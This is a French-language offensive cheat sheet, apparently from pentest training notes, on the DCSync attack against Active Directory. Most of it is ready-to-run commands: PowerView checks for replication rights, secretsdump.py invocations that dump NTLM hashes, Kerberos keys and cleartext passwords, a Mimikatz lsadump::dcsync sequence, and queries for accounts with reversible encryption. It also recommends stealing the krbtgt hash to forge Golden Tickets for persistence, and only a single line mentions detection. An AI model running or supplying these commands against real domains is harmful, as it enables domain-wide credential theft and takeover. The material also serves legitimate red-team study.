# DCSync

### <mark style="color:red;">Qu'est-ce que DCSync?</mark>

* Technique permettant de voler la base de données des mots de passe Active Directory
* Utilise le protocole Directory Replication Service Remote Protocol (utilisé par les contrôleurs de domaine)
* Permet à un attaquant d'imiter un contrôleur de domaine pour récupérer les hashes de mots de passe NTLM

***

### <mark style="color:red;">Prérequis pour l'attaque</mark>

* Contrôler un compte ayant des droits de réplication de domaine
* Nécessite les permissions :
  * `Replicating Directory Changes`
  * `Replicating Directory Changes All`
* Par défaut, ces droits sont accordés aux :
  * Administrateurs de domaine
  * Administrateurs d'entreprise
  * Comptes d'administrateurs par défaut

***

### <mark style="color:red;">Vérification des privilèges de réplication</mark>

#### <mark style="color:green;">Avec PowerView</mark>

```powershell
# Vérifier l'appartenance à des groupes
Get-DomainUser -Identity USERNAME | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Vérifier les droits de réplication (après avoir récupéré le SID)
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

***

### <mark style="color:red;">Exécution de l'attaque DCSync</mark>

#### <mark style="color:green;">Avec Impacket (secretsdump.py)</mark>

```bash
# Extraction complète (hashes NTLM + clés Kerberos)
secretsdump.py -outputfile PREFIX -just-dc DOMAINE/UTILISATEUR@IP_DC

# Extraction des hashes NTLM uniquement
secretsdump.py -outputfile PREFIX -just-dc-ntlm DOMAINE/UTILISATEUR@IP_DC

# Extraction pour un utilisateur spécifique
secretsdump.py -outputfile PREFIX -just-dc-user CIBLE_USER DOMAINE/UTILISATEUR@IP_DC

# Options supplémentaires utiles
# -pwd-last-set : Afficher quand les mots de passe ont été modifiés
# -history : Extraire l'historique des mots de passe
# -user-status : Vérifier si les comptes sont désactivés
```

#### <mark style="color:green;">Avec Mimikatz</mark>

```powershell
# Se connecter avec l'utilisateur ayant les droits de réplication
runas /netonly /user:DOMAINE\UTILISATEUR powershell

# Dans la session PowerShell ouverte
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:NOM_DOMAINE /user:DOMAINE\UTILISATEUR_CIBLE
```

***

### <mark style="color:red;">Vérification des comptes avec chiffrement réversible</mark>

#### <mark style="color:green;">Avec Get-ADUser</mark>

```powershell
# Trouver les comptes avec chiffrement réversible activé
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

#### <mark style="color:green;">Avec PowerView</mark>

```powershell
# Trouver les comptes avec chiffrement réversible activé
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

***

### <mark style="color:red;">Fichiers générés par secretsdump.py</mark>

* `PREFIX.ntds` : Contient les hashes NTLM
* `PREFIX.ntds.kerberos` : Contient les clés Kerberos
* `PREFIX.ntds.cleartext` : Contient les mots de passe en clair pour les comptes avec chiffrement réversible activé

***

### <mark style="color:red;">Points importants à retenir</mark>

* Les comptes avec chiffrement réversible activé exposent les mots de passe
* L'attaque DCSync est difficile à détecter car elle utilise un protocole légitime
* Idéal pour exfiltrer le hash du compte krbtgt et créer un Golden Ticket (persistence)
* Assurez-vous de surveiller les modifications des ACL du domaine pour détecter l'ajout de privilèges de réplication
